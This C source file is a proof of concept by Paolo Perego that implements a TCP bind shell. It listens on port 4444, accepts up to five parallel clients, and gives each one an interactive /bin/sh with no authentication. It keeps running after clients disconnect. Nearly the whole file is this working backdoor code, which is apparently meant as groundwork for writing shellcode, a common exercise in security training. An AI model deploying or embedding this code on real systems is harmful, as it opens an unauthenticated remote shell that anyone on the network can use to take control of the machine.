/*
 * tcp_bind_shellcode_poc.c: binds on a given TCP port and spawn a shell on *
 * incoming connections.
 *
 * Bonus features: 
 * 	+ bind shell doesn't die when all clients disconnect. 
 * 	+ it supports up to 5 incoming connections in parallel.
 *
 * BSD 2-Clause License
 *
 * Copyright (c) 2018, Paolo Perego
 * All rights reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

// for socket(), bind(), accept() calls
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define DPORT	4444

int main(int argc, char **argv) {
	int sfd, cfd, p;
	struct sockaddr_in my_addr;

	sfd = socket(AF_INET, SOCK_STREAM, 0);

	memset(&my_addr, 0, sizeof(struct sockaddr));

	my_addr.sin_family 	= AF_INET;
	my_addr.sin_port 	= htons(DPORT); 
	my_addr.sin_addr.s_addr = INADDR_ANY; 

	bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	listen(sfd, 5);

	while (1) {
		cfd = accept(sfd, NULL, NULL);

		p = fork();

		if ( p == 0 ) {
			dup2(cfd, 0);
			dup2(cfd, 1);
			dup2(cfd, 2);
			execve((const char *)"/bin/sh", NULL, NULL);
		}
	}
	return 0;
}
